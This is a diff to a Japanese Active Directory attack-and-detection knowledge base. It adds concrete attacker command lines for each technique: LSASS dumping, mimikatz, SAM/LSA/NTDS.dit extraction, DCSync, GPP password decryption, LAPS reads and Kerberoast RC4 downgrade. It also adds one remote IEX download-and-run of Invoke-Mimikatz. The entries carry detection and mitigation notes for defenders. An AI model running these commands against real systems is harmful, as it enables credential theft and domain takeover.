     "events": "4769, 4768 (信頼アカウント対象, Enc Type 0x17)",
     "mitigate": "信頼鍵の定期ローテーション、信頼のAES化、不要な信頼の削除とSID フィルタリング/選択的認証の有効化を行う。信頼アカウント宛のKerberos要求を重点監視する。",
@@ -872,6 +1463,28 @@ AD.I18N.ja.attacks = [
     "summary": "AS-REQ/TGS-REQで攻撃者がサポート暗号化タイプにRC4-HMAC(etype 23)のみを提示し、AESより脆弱なRC4でチケットを暗号化させてKerberoast/AS-REP Roastのクラックコストを劇的に下げる補助攻撃。",
     "how": "Kerberoast/AS-REP Roast実行時にリクエストのetypeフィールドをRC4のみに設定する(RubeusではAES有効アカウントにもRC4を強制する /tgtdeleg が実ダウングレード手段。/rc4opsec は逆にAES非対応アカウント限定でRC4要求の検知を避けるOPSECオプション。なおWin Server 2019以降はtgtdelegでもAES有効アカウントにはAESが返り不成立の場合あり)。KDCがRC4をまだ許容していると、AES鍵の代わりにNTLMハッシュ由来のRC4鍵でチケットが暗号化され、hashcat -m 13100/18200での総当たりが高速化する。前提はドメインでRC4が無効化されていないこと。",
     "tools": "Rubeus (/tgtdeleg=RC4強制, /rc4opsec=AES非対応アカウント限定のOPSEC), mimikatz, impacket(指定etype), hashcat -m 13100/18200",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "TGT-Delegトリックを使いAES対応アカウントにもRC4を強制要求。WS2019以降のDCでは失敗しAES256のまま返る点に注意",
+        "q": "Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "対照的にAES非対応アカウントのみへRC4要求を絞るOPSEC版。暗号種別だけを見る検知はすり抜ける",
+        "q": "Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "既定でetypeリストにRC4(23)を含めてTGS-REQを送るため、DCがRC4を許容していれば追加操作なしにダウングレードが成立する",
+        "q": "GetUserSPNs.py -request -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!' -outputfile hashes.txt"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "ダウングレード成立後のRC4ハッシュを高速クラック。AES版(19600/19700)より数百倍速く解読できる",
+        "q": "hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule"
+      }
+    ],
     "detect": "イベントID 4768/4769のTicket Encryption Typeが0x17(RC4-HMAC)や0x18になっている要求を監視する。AESが標準化された環境でRC4要求が観測されるのはダウングレード攻撃の直接的兆候であり、ベースライン(通常0x12 AES256)からの逸脱として検知する。",
     "events": "4768/4769 (Encryption Type 0x17=RC4-HMAC, 0x18=RC4-HMAC-EXP)",
     "mitigate": "グループポリシーでKerberos許可暗号化タイプをAES128/256のみに制限しRC4/DESを完全無効化する(msDS-SupportedEncryptionTypes)。レガシー依存を洗い出して段階移行し、RC4要求をアラート対象にする。KRBTGTやサービスアカウントのAES鍵を確実に生成するためパスワードを再設定する。",
@@ -907,6 +1520,23 @@ AD.I18N.ja.attacks = [
     "summary": "OS標準DLL(comsvcs.dll)のMiniDumpエクスポートを悪用し、LSASSプロセスメモリをディスクにダンプして平文/NTLMハッシュ/Kerberosチケットを窃取する。",
     "how": "前提: 対象ホストでSeDebugPrivilegeを持つローカル管理者権限。手順: LSASSのPIDを取得し rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\temp\\lsass.dmp full を実行。生成した.dmpをオフラインへ持ち出し、攻撃者側でmimikatz(sekurlsa::minidump→sekurlsa::logonPasswords)やpypykatzで解析。追加署名バイナリ不要のためAV検知を回避しやすい。",
     "tools": "rundll32.exe+comsvcs.dll, mimikatz sekurlsa::minidump, pypykatz, tasklist/Get-Process",
+    "cmd": [
+      {
+        "tool": "rundll32.exe",
+        "t": "OS標準DLLの正規エクスポートでLSASSをダンプ。`comsvcs.dll` と `MiniDump` の同時出現が高信頼シグナル",
+        "q": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full"
+      },
+      {
+        "tool": "rundll32.exe",
+        "t": "エクスポート名を序数で隠す変種。`comsvcs` + `#24` の組み合わせも同時に見る必要がある",
+        "q": "rundll32.exe comsvcs.dll,#24 672 C:\\Windows\\Temp\\out.bin full"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PIDを動的解決するため文字列 `lsass` が引数に出ない。4104のスクリプトブロックで `comsvcs` を見る",
+        "q": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ((Get-Process lsass).Id) C:\\Windows\\Temp\\l.dmp full"
+      }
+    ],
     "detect": "Sysmon EventID 10 (ProcessAccess) でlsass.exeへのGrantedAccess 0x1010/0x1410/0x143a等のアクセスを監視。rundll32.exeがcomsvcs.dll MiniDumpを引数に実行するコマンドライン(4688/Sysmon1)を検知。EDRでLSASSハンドルオープン元プロセスを相関。",
     "events": "Sysmon 10, Sysmon 1, 4688, Sysmon 11(dmp生成)",
     "mitigate": "Credential Guard(VBS)有効化でLSASS内資格情報を隔離。LSASS RunAsPPL(RunAsPPL=1)でProtected Process Light化。※Windows 11 22H2以降/24H2ではLSA保護(RunAsPPL)が既定で有効化される方向(新規インストールは即時、アップグレードは約5日間の評価期間+再起動後に有効)で、Credential GuardもEnterprise 22H2以降の対応機で既定オンのため、無効前提にせず実機の適用状態を監査で確認する。ASRルール『LSASSからの資格情報窃取をブロック』(GUID 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)をブロックモードで有効化。管理者権限の最小化とTier分離。",
@@ -942,6 +1572,33 @@ AD.I18N.ja.attacks = [
     "summary": "署名済みSysinternals procdumpや各種ダンパでLSASSのフルメモリダンプを取得する亜種群。EDR回避のため直接syscallやハンドル複製を使う実装も多数。",
     "how": "前提: ローカル管理者+SeDebugPrivilege。procdump.exe -accepteula -ma lsass.exe lsass.dmp で署名済みバイナリを使いダンプ。GUIならタスクマネージャ右クリック『ダンプファイルの作成』。EDR回避亜種: nanodump(直接syscall+署名無効化), dumpert(NtReadVirtualMemory直呼び), MirrorDump, HandleKatz(既存ハンドル複製), SilentProcessExit(WerFault経由)。解析はオフラインでpypykatz。",
     "tools": "procdump.exe, nanodump, dumpert, HandleKatz, MirrorDump, SilentProcessExit手法, WerFault.exe",
+    "cmd": [
+      {
+        "tool": "ProcDump",
+        "t": "正規署名のSysinternalsツールでのフルダンプ。`-ma` と `lsass` の同居が主軸",
+        "q": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
+      },
+      {
+        "tool": "ProcDump",
+        "t": "プロセス名を伏せPID指定にした変種。`lsass` 文字列だけの検知はすり抜けるので `-ma` 単体も拾う",
+        "q": "procdump64.exe -accepteula -ma 672 C:\\Users\\Public\\out.dmp"
+      },
+      {
+        "tool": "createdump.exe",
+        "t": ".NET同梱のLOLBin。Sysinternals名を避けられるためProcDump前提の検知が空振りする",
+        "q": "createdump.exe -u -f C:\\Windows\\Temp\\lsass.dmp 672"
+      },
+      {
+        "tool": "taskmgr.exe",
+        "t": "GUI操作でコマンドラインが残らない典型。EID11で `%TEMP%\\lsass.DMP` の生成元がtaskmgr.exeかで判断する",
+        "q": "(コマンドライン無し) タスクマネージャ → lsass.exe 右クリック → ダンプファイルの作成"
+      },
+      {
+        "tool": "nanodump",
+        "t": "無効化シグネチャ付き独自形式で出力しMiniDumpWriteDumpを使わない。ファイル名検知よりEID10のハンドル取得で見る",
+        "q": "nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx"
+      }
+    ],
     "detect": "Sysmon 10でlsass.exeへの高権限ハンドル取得を監視(procdump/未署名/異常な呼び出し元)。procdumpのコマンドライン引数(-ma lsass)を検知。SilentProcessExitはSilentProcessExitレジストリキー(HKLM\\...\\Image File Execution Options)変更を監視。",
     "events": "Sysmon 10, Sysmon 1/4688, Sysmon 13(レジストリ改変), Sysmon 11",
     "mitigate": "RunAsPPL+Credential Guard。ASRルール適用。procdump等Sysinternals利用のアプリケーション制御(WDAC/AppLocker)。EDRのLSASSアクセス保護(tamper protection)。Restricted Admin/リモートクレデンシャルガード運用。",
@@ -982,6 +1639,33 @@ AD.I18N.ja.attacks = [
     "summary": "mimikatzをホスト上で直接実行し、LSASSメモリから平文パスワード・NTLMハッシュ・Kerberosチケット・DPAPIマスターキーをライブ抽出する。",
     "how": "前提: ローカル管理者。mimikatz起動→privilege::debug→sekurlsa::logonpasswords(全ログオンセッションの資格情報), sekurlsa::ekeys(Kerberos AES鍵), sekurlsa::tickets(TGT/TGS), sekurlsa::dpapi(マスターキー)。WDigest有効環境(旧OS/UseLogonCredential=1)では平文が取れる。メモリのみ実行のためファイルレス化(Invoke-Mimikatz, Cobalt Strike mimikatz)も一般的。",
     "tools": "mimikatz, Invoke-Mimikatz(PowerShell), Cobalt Strike, pypykatz(live)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "ライブLSASSからの資格情報抽出。`privilege::debug` と `sekurlsa::logonpasswords` の並びは決定的",
+        "q": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "取得済みダンプのオフライン解析。攻撃者端末側で走るためDCや標的機にはログが残らない",
+        "q": "mimikatz # sekurlsa::minidump lsass.dmp"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "メモリ内実行でバイナリが落ちない。4104に `Invoke-Mimikatz` / `DumpCreds` が残る",
+        "q": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.99/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+      },
+      {
+        "tool": "pypykatz",
+        "t": "Python実装のためmimikatz名の検知に掛からない。ダンプ持ち出し後のLinux側解析でよく使われる",
+        "q": "pypykatz lsa minidump lsass.dmp"
+      },
+      {
+        "tool": "NetExec",
+        "t": "リモートから一括収集。標的側にはSMB経由のサービス作成/実行の痕跡が出る",
+        "q": "netexec smb 10.0.0.20 -u administrator -p 'Passw0rd!' -M lsassy"
+      }
+    ],
     "detect": "mimikatz固有文字列/APIコールをAV/EDRで検知。Sysmon 10のlsassアクセス。PowerShell ScriptBlockログ(4104)でInvoke-Mimikatz痕跡。異常なプロセスからのSeDebugPrivilege有効化。",
     "events": "Sysmon 10, 4104, 4688, 4673(特権呼び出し)",
     "mitigate": "WDigest無効化(UseLogonCredential=0)を強制しGPOで固定。Credential Guard/RunAsPPL。ASRルール。ログオンセッション最小化、対話ログオン後の管理者資格を残さないTier運用。",
@@ -1017,6 +1701,28 @@ AD.I18N.ja.attacks = [
     "summary": "SAMレジストリハイブとSYSTEM(bootkey)を取得し、ローカルアカウントのNTLMハッシュを抽出。ローカル管理者の横展開(PtH)やパスワードクラックに利用。",
     "how": "前提: ローカル管理者。reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save でハイブを退避、オフラインで impacket secretsdump.py -sam sam.save -system system.save LOCAL で復号。ライブでは mimikatz lsadump::sam。リモートは secretsdump.py DOMAIN/user@host。VSSコピーやesentutlでロック回避も可能。",
     "tools": "reg.exe save, impacket-secretsdump, mimikatz lsadump::sam, NetExec --sam",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "SAM/SYSTEM/SECURITYの3ハイブ退避。`reg save` と `hklm\\sam` の同居はほぼ黒",
+        "q": "reg.exe save hklm\\sam C:\\Windows\\Temp\\sam.hiv & reg.exe save hklm\\system C:\\Windows\\Temp\\sys.hiv"
+      },
+      {
+        "tool": "Impacket",
+        "t": "退避済みハイブからのローカル抽出。`LOCAL` 指定は攻撃者手元での実行を意味する",
+        "q": "secretsdump.py -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL"
+      },
+      {
+        "tool": "NetExec",
+        "t": "リモートから直接SAMを取得。`--sam` はSMB経由のリモートレジストリ操作を伴う",
+        "q": "netexec smb 10.0.0.20 -u administrator -p 'Passw0rd!' --sam"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "ライブSAMからのローカルハッシュ取得。`lsadump::sam` が観測文字列",
+        "q": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit"
+      }
+    ],
     "detect": "reg.exe save でSAM/SECURITY/SYSTEMを対象にするコマンドライン(4688/Sysmon1)。SAM/SECURITYハイブへのハンドルアクセス(4656/4663, SACL設定時)。リモートsecretsdump由来のサービス作成(7045)やadmin$アクセス。",
     "events": "4688/Sysmon 1, 4656/4663, 4657, 7045(リモート時)",
     "mitigate": "LAPSでローカル管理者パスワードを一意化しPtH横展開を無力化。ローカル管理者アカウント無効化/リネーム。Credential Guardは対象外なので機微ハイブのSACL監査を有効化。EDRでreg save+SAM引数をブロック。",
@@ -1052,6 +1758,28 @@ AD.I18N.ja.attacks = [
     "summary": "LSA Secrets(サービスアカウント平文パスワード、マシンアカウント、DPAPI_SYSTEM、自動ログオン資格情報、キャッシュ)を復号して窃取する。",
     "how": "前提: ローカル管理者(SYSTEM相当)。SECURITY+SYSTEMハイブから impacket secretsdump.py が LSA secrets を復号出力。ライブでは mimikatz lsadump::secrets。ここからサービスアカウントの平文パスワード、DefaultPassword(自動ログオン)、$MACHINE.ACC、_SC_<サービス>等が得られ、ドメインサービスアカウント奪取や横展開に直結。",
     "tools": "impacket-secretsdump, mimikatz lsadump::secrets, NetExec --lsa, reg save",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "サービスアカウントの平文パスワードを含むLSA Secretsを取得。`lsadump::secrets` が決定的",
+        "q": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" exit"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "SECURITY+SYSTEMハイブ退避経由の間接取得。`hklm\\security` の保存はほぼ運用上の必要が無い",
+        "q": "reg.exe save hklm\\security C:\\Windows\\Temp\\sec.hiv & reg.exe save hklm\\system C:\\Windows\\Temp\\sys.hiv"
+      },
+      {
+        "tool": "Impacket",
+        "t": "退避ハイブからLSA Secretsを復号。`-security` 指定が出たらSAM単独ではなく秘密領域が狙われている",
+        "q": "secretsdump.py -security sec.hiv -system sys.hiv LOCAL"
+      },
+      {
+        "tool": "NetExec",
+        "t": "リモート一括取得。`--lsa` はLSA SecretsとDCC2キャッシュを同時に引く",
+        "q": "netexec smb 10.0.0.20 -u administrator -p 'Passw0rd!' --lsa"
+      }
+    ],
     "detect": "SECURITYハイブへのアクセス(4656/4663 SACL)、reg save SECURITYコマンドライン。リモート実行時のサービス作成7045/RemoteRegistryアクセス。サービスアカウント平文が露出した後の異常認証を相関。",
     "events": "4688/Sysmon 1, 4656/4663, 7045",
     "mitigate": "サービスをgMSA/MSAへ移行し平文パスワード保存を排除。自動ログオン(DefaultPassword)の廃止。強力なサービスアカウントパスワード+ローテーション。特権昇格の抑止とEDR。",
@@ -1087,6 +1815,28 @@ AD.I18N.ja.attacks = [
     "summary": "DC不達時のオフラインログオン用にローカルにキャッシュされたドメイン資格情報(MSCACHEv2ハッシュ)を抽出しオフラインクラックする。",
     "how": "前提: ローカル管理者。SECURITY+SYSTEMハイブから impacket secretsdump.py が $DCC2$ 形式のキャッシュを出力、または mimikatz lsadump::cache。MSCACHEv2はPtHには使えないが、hashcat -m 2100 でオフライン辞書/総当たり可能。近年ログオンしたドメインユーザ(特に特権者)の平文回収を狙う。既定で直近10件キャッシュ。",
     "tools": "impacket-secretsdump, mimikatz lsadump::cache, cachedump, hashcat -m 2100",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "DCC2(MSCACHEv2)キャッシュの取得。`lsadump::cache` はDC不通時でも刺さる資格情報を狙う動き",
+        "q": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "ハイブ退避経由でDCC2を抽出。出力の `$DCC2$` 接頭辞がキャッシュ資格情報流出の裏付け",
+        "q": "secretsdump.py -security sec.hiv -system sys.hiv LOCAL"
+      },
+      {
+        "tool": "NetExec",
+        "t": "リモートからキャッシュを含むLSA領域を一括取得",
+        "q": "netexec smb 10.0.0.20 -u administrator -p 'Passw0rd!' --lsa"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "持ち出し後のオフライン解析。モード2100=DCC2で、2100の出現自体がキャッシュ奪取成立の裏付け",
+        "q": "hashcat -m 2100 -a 0 dcc2.txt rockyou.txt"
+      }
+    ],
     "detect": "SECURITYハイブアクセス(4656/4663)。reg save/secretsdump痕跡。MSCACHEv2自体はネット通信を生まないため、ハイブ持ち出しとオフライン挙動の相関が中心。",
     "events": "4688/Sysmon 1, 4656/4663",
     "mitigate": "GPOでキャッシュ数を削減(CachedLogonsCount=0〜1、可用性とトレードオフ)。特権アカウントを一般端末で対話ログオンさせない(キャッシュ生成を防止)。強力なパスフレーズでオフラインクラック耐性向上。",
@@ -1122,6 +1872,38 @@ AD.I18N.ja.attacks = [
     "summary": "ドメインコントローラ上でVSSスナップショットを作成しロック中のNTDS.ditとSYSTEMハイブをコピー、全ドメインアカウントのハッシュ(krbtgt含む)を抽出する。",
     "how": "前提: DC上のDomain Admin/DC管理者。vssadmin create shadow /for=C: でシャドウ作成→\\\\?\\GLOBALROOT\\...\\Windows\\NTDS\\NTDS.dit と SYSTEM を copy。代替: diskshadowスクリプト、esentutl /y /vss、wbadmin、ntdsutil ifm。オフラインで secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL または DSInternals で全ハッシュ抽出。krbtgtハッシュ入手でGolden Ticketへ発展。",
     "tools": "vssadmin, diskshadow, esentutl, wbadmin, ntdsutil(ifm), impacket-secretsdump, DSInternals",
+    "cmd": [
+      {
+        "tool": "vssadmin",
+        "t": "シャドウコピー作成。DC上での `vssadmin create shadow` はバックアップ製品以外ではまず出ない",
+        "q": "vssadmin.exe create shadow /for=C:"
+      },
+      {
+        "tool": "cmd.exe",
+        "t": "シャドウ経由でNTDS.ditを複製。`GLOBALROOT` と `ntds.dit` の同居が主軸",
+        "q": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit"
+      },
+      {
+        "tool": "diskshadow.exe",
+        "t": "MS署名LOLBinでのシャドウ操作。スクリプトファイル指定のため作成コマンド自体が引数に出ない",
+        "q": "diskshadow.exe /s C:\\Windows\\Temp\\shadow.txt"
+      },
+      {
+        "tool": "esentutl.exe",
+        "t": "VSS経由で使用中ファイルを直接コピー。`/vss` と `ntds.dit` の組み合わせは正規運用に無い",
+        "q": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit"
+      },
+      {
+        "tool": "wmic",
+        "t": "WMI経由のシャドウ作成。vssadmin名の検知を回避する変種",
+        "q": "wmic shadowcopy call create Volume='C:\\'"
+      },
+      {
+        "tool": "Impacket",
+        "t": "持ち出したditとSYSTEMハイブからの一括抽出。攻撃者手元での実行のため標的側ログは無い",
+        "q": "secretsdump.py -ntds ntds.dit -system sys.hiv LOCAL"
+      }
+    ],
     "detect": "DC上のvssadmin create shadow / diskshadow / ntdsutil / esentutl 実行(4688/Sysmon1)。VSS作成イベント。NTDS.dit・GLOBALROOTパスへのファイルアクセス。DCでのシャドウコピー操作は正当な運用外なら高疑。",
     "events": "4688/Sysmon 1, 8222(VSS), 4656/4663(NTDSアクセス), Sysmon 11",
     "mitigate": "DCへのログオン権限を厳格に限定(Tier0)。DCでのvssadmin/ntdsutil実行を監視・アラート化。Credential Guardは対象外だが、DC隔離・特権アクセスワークステーション(PAW)・LAPS/多要素で管理者奪取自体を困難化。krbtgt定期二重リセット。",
@@ -1157,6 +1939,23 @@ AD.I18N.ja.attacks = [
     "summary": "追加ドメインコントローラ(書き込み可能DCまたはRODC)をネットワーク越しの初期レプリケーションなしに昇格させるためのntdsutil『Install From Media(IFM)』機能を悪用し、NTDS.ditとレジストリをまとめてエクスポートしてハッシュを窃取する。シークレットを保持する create full(書込可能DC向け)を用い、create rodc(RODC向け・シークレット除去)ではない。",
     "how": "前提: DC上の管理者権限。powershell -c \"ntdsutil 'ac i ntds' 'ifm' 'create full C:\\temp\\ifm' q q\" で NTDS.dit・SYSTEM・SECURITY を一括生成。正規管理ツールのためAV検知が弱い。生成物をオフラインへ持ち出し secretsdump.py -ntds ... -system ... LOCAL で全ドメインハッシュ抽出。",
     "tools": "ntdsutil.exe, impacket-secretsdump, DSInternals",
+    "cmd": [
+      {
+        "tool": "ntdsutil.exe",
+        "t": "IFMメディア作成でNTDS.ditとSYSTEMハイブを一括取得。`ifm` と `create full` の同居が決定的",
+        "q": "ntdsutil.exe \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" quit quit"
+      },
+      {
+        "tool": "ntdsutil.exe",
+        "t": "短縮形での同一操作。`ac i ntds` は略記のため `activate instance` だけの検知では漏れる",
+        "q": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\x\" q q"
+      },
+      {
+        "tool": "NetExec",
+        "t": "リモートからのNTDS取得。`--ntds` 既定はDRSUAPI(DCSync相当)、`vss` 指定でシャドウ経由に切り替わる",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --ntds vss"
+      }
+    ],
     "detect": "DC上のntdsutil.exe実行と『ifm』『create full』を含むコマンドライン(4688/Sysmon1)。C:\\直下等への大きなNTDS.dit生成(Sysmon11)。正規のDC昇格作業以外での実行を高疑として即時アラート。",
     "events": "4688/Sysmon 1, Sysmon 11",
     "mitigate": "DC上の対話操作を最小権限・PAW経由に限定。ntdsutil実行のホワイトリスト化と監視。Tier0隔離、変更管理外のIFM生成を禁止。",
@@ -1192,6 +1991,33 @@ AD.I18N.ja.attacks = [
     "summary": "DCを物理的に触らず、ディレクトリ複製プロトコル(DRSUAPI/GetNCChanges)を悪用して任意ユーザ(krbtgt含む)のハッシュをリモートで複製取得する。",
     "how": "前提: Replicating Directory Changes / All / In Filtered Set 権限(既定はDA/DC/Enterprise Admin、委任ミスで一般ユーザが持つ場合あり)。mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt または impacket secretsdump.py -just-dc corp/user@dc。NTDS.dit窃取と同等の結果をリモートで得られGolden Ticketへ発展。",
     "tools": "mimikatz lsadump::dcsync, impacket-secretsdump -just-dc, NetExec",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "krbtgtのハッシュをレプリケーション経由で取得。`lsadump::dcsync` は決定的シグナル",
+        "q": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "全アカウント一括取得。DC側に大量の4662(DS-Replication-Get-Changes)を伴う",
+        "q": "mimikatz # lsadump::dcsync /domain:corp.local /all /csv"
+      },
+      {
+        "tool": "Impacket",
+        "t": "リモートからNTDS相当を抽出。DCにプロセスログは残らずレプリケーション権限GUIDの4662が唯一の手掛かり",
+        "q": "secretsdump.py -just-dc corp.local/administrator@10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`--ntds` でDCSync相当を一括実行。SMB接続元IPがDC以外なら黒",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --ntds"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "正規署名モジュールでのレプリケーション取得のため実行ファイル検知が効かない。4104に関数名が残る",
+        "q": "Get-ADReplAccount -SamAccountName krbtgt -Domain corp -Server dc01.corp.local"
+      }
+    ],
     "detect": "DC上のディレクトリ複製イベント4662(GUID: DS-Replication-Get-Changes 1131f6aa/1131f6ad/89e95b76)が『DCでないホスト/一般ユーザ』から発生。非DCソースIPからのDRSUAPI(RPC)。BloodHoundで複製権限保有者を棚卸し。",
     "events": "4662, 4624(ログオン相関), ネットワークDRSUAPI",
     "mitigate": "複製権限(GetChanges/GetChangesAll)の保有者を最小化・棚卸し。委任の見直し。DCからの複製元IPホワイトリスト(IPsec/ファイアウォール)。4662の複製GUID監視をSIEMでアラート化。",
@@ -1232,6 +2058,33 @@ AD.I18N.ja.attacks = [
     "summary": "SYSVOL上のGPP XML(Groups.xml等)に含まれるcpassword属性を、公開済み固定AES鍵で復号してローカル/サービスアカウント平文パスワードを取得する。",
     "how": "前提: 任意の認証済みドメインユーザ(SYSVOLは全ユーザ読取可)。\\\\domain\\SYSVOL 配下のGroups.xml/Services.xml/ScheduledTasks.xml/Drives.xml/DataSources.xml/Printers.xml からcpassword値を収集し、Microsoftが公開した固定AES-256鍵で復号。Get-GPPPassword(PowerSploit)、gpp-decrypt、impacket Get-GPPPassword.py。得た平文はローカル管理者共通化なら横展開に直結。",
     "tools": "Get-GPPPassword(PowerSploit), gpp-decrypt(Kali), impacket Get-GPPPassword.py, findstr /S cpassword",
+    "cmd": [
+      {
+        "tool": "findstr.exe",
+        "t": "SYSVOLを全文検索する古典。`cpassword` 文字列の検索自体がほぼ黒",
+        "q": "findstr /S /I cpassword \\\\corp.local\\sysvol\\corp.local\\policies\\*.xml"
+      },
+      {
+        "tool": "PowerSploit",
+        "t": "GPP XMLの自動収集と復号。4104に `Get-GPPPassword` が残る",
+        "q": "Get-GPPPassword -Server dc01.corp.local"
+      },
+      {
+        "tool": "gpp-decrypt",
+        "t": "公開済みAES固定鍵での復号。攻撃者手元の実行だがSYSVOL大量読み取り(5145)と時間相関する",
+        "q": "gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'"
+      },
+      {
+        "tool": "NetExec",
+        "t": "モジュール経由でSYSVOL全体を走査。SMB読み取りが短時間に集中する",
+        "q": "netexec smb 10.0.0.10 -u svc_user -p 'Passw0rd!' -M gpp_password"
+      },
+      {
+        "tool": "Snaffler",
+        "t": "共有全体から資格情報らしき文字列を機械収集。`cpassword` 以外のパターンも同時に引く",
+        "q": "Snaffler.exe -s -d corp.local -o C:\\Windows\\Temp\\snaffler.log"
+      }
+    ],
     "detect": "SYSVOL内XMLへのcpassword文字列検索。SYSVOLへの大量ファイルアクセス。ドメイン内でのGet-GPPPassword実行(4104)。既存GPP XMLの棚卸し。",
     "events": "4104, 5145(共有オブジェクトアクセス, SACL時)",
     "mitigate": "MS14-025適用でGPPパスワード新規作成を防止。SYSVOL全体をfindstr等でcpassword残存監査し該当GPP/XMLを削除。露出した資格情報を即時ローテーション。LAPSへ移行。",
@@ -1267,6 +2120,33 @@ AD.I18N.ja.attacks = [
     "summary": "ローカル管理者パスワード管理(LAPS)の平文属性(ms-Mcs-AdmPwd / msLAPS-Password)を、過剰に付与された読取権限を悪用してLDAPから取得する。",
     "how": "前提: 対象コンピュータオブジェクトのms-Mcs-AdmPwd属性へのReadProperty(ControlAccess)権限を持つユーザ(委任ミスで拡大しがち)。LDAPで (ms-Mcs-AdmPwdExpirationTime=*) を検索し ms-Mcs-AdmPwd を読む。ツール: pyLAPS, LAPSDumper, Get-LAPSPasswords, NetExec -M laps, BloodHoundでReadLAPSPassword edge特定。Windows LAPSでは暗号化(DPAPI-NG)対応だが平文保管環境も残存。",
     "tools": "pyLAPS, LAPSDumper, Get-LAPSPasswords(PowerShell), NetExec -M laps, BloodHound",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "LDAP経由でLAPS平文属性を読む正攻法。`ms-Mcs-AdmPwd` の要求自体がハンティングの主軸",
+        "q": "Get-ADComputer -Identity WS01 -Properties ms-Mcs-AdmPwd | Select-Object name,ms-Mcs-AdmPwd"
+      },
+      {
+        "tool": "AdmPwd.PS",
+        "t": "Microsoft純正LAPSモジュール。正規運用と重なるので読み取り主体と対象台数で切り分ける",
+        "q": "Get-AdmPwdPassword -ComputerName WS01"
+      },
+      {
+        "tool": "NetExec",
+        "t": "全コンピュータ分を一括収集。短時間に多数の `ms-Mcs-AdmPwd` 読み取りが並ぶ",
+        "q": "netexec ldap 10.0.0.10 -u svc_user -p 'Passw0rd!' -M laps"
+      },
+      {
+        "tool": "pyLAPS",
+        "t": "Linux側からのLDAP読み取り。端末プロセスログは残らずDCの4662/LDAP監査で見る",
+        "q": "pyLAPS.py --action get -d corp.local -u svc_user -p 'Passw0rd!' --dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "汎用LDAPクライアントでの属性読み。ツール名ベースの検知が効かない",
+        "q": "bloodyAD -d corp.local -u svc_user -p 'Passw0rd!' --host 10.0.0.10 get object WS01$ --attr ms-Mcs-AdmPwd"
+      }
+    ],
     "detect": "ms-Mcs-AdmPwd属性の読取(4662, プロパティGUID指定のSACL監査)。想定外プリンシパルによるLAPS属性LDAP検索。BloodHoundでReadLAPSPassword保有者の異常拡大を検知。",
     "events": "4662(属性アクセス, SACL要), 4624",
     "mitigate": "ms-Mcs-AdmPwd/msLAPS読取ACLを最小権限で棚卸し(委任削除)。Windows LAPSの暗号化(DPAPI-NG)有効化。読取アクセス監査SACLを全コンピュータOUに設定。定期ローテーション。",
@@ -1307,6 +2187,33 @@ AD.I18N.ja.attacks = [
     "summary": "グループ管理サービスアカウント(gMSA)のmsDS-ManagedPassword blobを、PrincipalsAllowedToRetrieveManagedPasswordに含まれるプリンシパルで取得しNTLMハッシュを算出する。",
